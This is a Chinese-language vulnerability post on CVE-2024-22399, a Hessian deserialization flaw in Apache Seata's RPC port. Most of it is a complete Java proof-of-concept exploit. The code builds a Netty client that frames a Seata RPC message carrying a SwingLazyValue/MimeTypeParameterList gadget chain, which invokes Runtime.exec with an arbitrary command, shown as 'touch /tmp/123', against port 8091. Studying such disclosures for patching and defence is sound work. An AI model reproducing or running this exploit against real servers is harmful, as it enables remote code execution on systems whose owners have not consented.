# Apache-Seata存在Hessian反序列化漏洞(CVE-2024-22399)

Apache Seata(incubating) 是一款开源的分布式事务解决方案，用于在微服务架构下提供高性能和简单易用的分布式事务服务。

Seata用于服务端与客户端通信的RPC协议（默认8091端口）以及2.0.0开始实现的Raft协议消息均支持hessian格式，在2.1.0及1.8.1版本之前的Hessian反序列化操作校验不严格，自身安全校验HessianSerializerFactory只作用于serialize序列化过程。

攻击者可通过向Seata服务端发送恶意的hessian格式RPC数据，通过SwingLazyValue等利用链反序列化执行任意代码。

## poc

```java
package org.example;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.MessageToByteEncoder;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.seata.core.protocol.RpcMessage;
import io.seata.core.compressor.Compressor;
import io.seata.core.compressor.CompressorFactory;
import io.seata.core.rpc.netty.v1.HeadMapSerializer;
import io.seata.serializer.hessian.HessianSerializerFactory;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Map;

import static io.seata.common.util.ReflectionUtil.setFieldValue;

public class SeataPoc {
    public SeataPoc() {
    }

    public void SendPoc(String host,int port) throws InterruptedException {
        EventLoopGroup group = new NioEventLoopGroup();
        try {
            Bootstrap bootstrap = new Bootstrap();
            bootstrap.group(group)
                    .channel(NioSocketChannel.class)
                    .handler(new ChannelInitializer<SocketChannel>() {
                        @Override
                        protected void initChannel(SocketChannel ch) {
                            ch.pipeline().addLast(new HessianEncoder());
                            ch.pipeline().addLast(new SendPocHandler());
                        }
                    });
            // 连接到服务器
            ChannelFuture future = bootstrap.connect(host, port).sync();
            // 等待连接关闭
            future.channel().closeFuture().sync();
        } finally {
            group.shutdownGracefully();
        }
    }

    private class HessianEncoder extends MessageToByteEncoder {
        public HessianEncoder() {
        }

        public void encode(ChannelHandlerContext ctx, Object msg, ByteBuf out) {
            try {
                if (!(msg instanceof RpcMessage)) {
                    throw new UnsupportedOperationException("Not support this class:" + msg.getClass());
                }

                RpcMessage rpcMessage = (RpcMessage)msg;
                int fullLength = 16;
                int headLength = 16;
                byte messageType = rpcMessage.getMessageType();
                out.writeBytes(new byte[]{-38, -38});
                out.writeByte(1);
                out.writerIndex(out.writerIndex() + 6);
                out.writeByte(messageType);
                out.writeByte(rpcMessage.getCodec());
                out.writeByte(rpcMessage.getCompressor());
                out.writeInt(rpcMessage.getId());
                Map<String, String> headMap = rpcMessage.getHeadMap();
                if (headMap != null && !headMap.isEmpty()) {
                    int headMapBytesLength = HeadMapSerializer.getInstance().encode(headMap, out);
                    headLength += headMapBytesLength;
                    fullLength += headMapBytesLength;
                }

                byte[] bodyBytes = null;
                if (messageType != 3 && messageType != 4) {

                    SerializerFactory hessian = HessianSerializerFactory.getInstance();
                    hessian.setAllowNonSerializable(true);
                    byte[] stream = null;
                    try {
                        com.caucho.hessian.io.Serializer serializer1 = hessian.getSerializer(rpcMessage.getBody().getClass());
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        Hessian2Output output = new Hessian2Output(baos);
                        output.getSerializerFactory().setAllowNonSerializable(true);
                        serializer1.writeObject(rpcMessage.getBody(), output);
                        output.close();
                        stream = baos.toByteArray();
                    } catch (IOException var7) {
                        System.out.println(var7);
                    }

                    bodyBytes = stream;

                    Compressor compressor = CompressorFactory.getCompressor(rpcMessage.getCompressor());
                    bodyBytes = compressor.compress(bodyBytes);
                    fullLength += bodyBytes.length;
                }

                if (bodyBytes != null) {
                    out.writeBytes(bodyBytes);
                }

                int writeIndex = out.writerIndex();
                out.writerIndex(writeIndex - fullLength + 3);
                out.writeInt(fullLength);
                out.writeShort(headLength);
                out.writerIndex(writeIndex);
            } catch (Throwable var12) {
                System.out.println(var12);
            }

        }
    }

    private class SendPocHandler extends ChannelInboundHandlerAdapter {
        @Override
        public void channelActive(ChannelHandlerContext ctx) throws Exception{
            // 连接成功时发送消息
            RpcMessage rpcMessage = new RpcMessage();
            rpcMessage.setCodec((byte) 22);
            // evil Object
            rpcMessage.setBody(GenObject("touch /tmp/123"));
            ctx.writeAndFlush(rpcMessage);
        }

        public Object GenObject(String cmd) throws Exception{
            UIDefaults uiDefaults = new UIDefaults();
            Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
            Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);

            SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{cmd}}});

            uiDefaults.put("xxx", slz);
            MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();

            setFieldValue(mimeTypeParameterList,"parameters",uiDefaults);

            return mimeTypeParameterList;

        }

    }

    public static void main(String[] args) throws Exception{
        SeataPoc seataPoc = new SeataPoc();
        seataPoc.SendPoc("127.0.0.1", 8091);

    }

}
```

![image-20240920111854721](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409201118874.png)

## 漏洞来源

- https://xz.aliyun.com/t/15653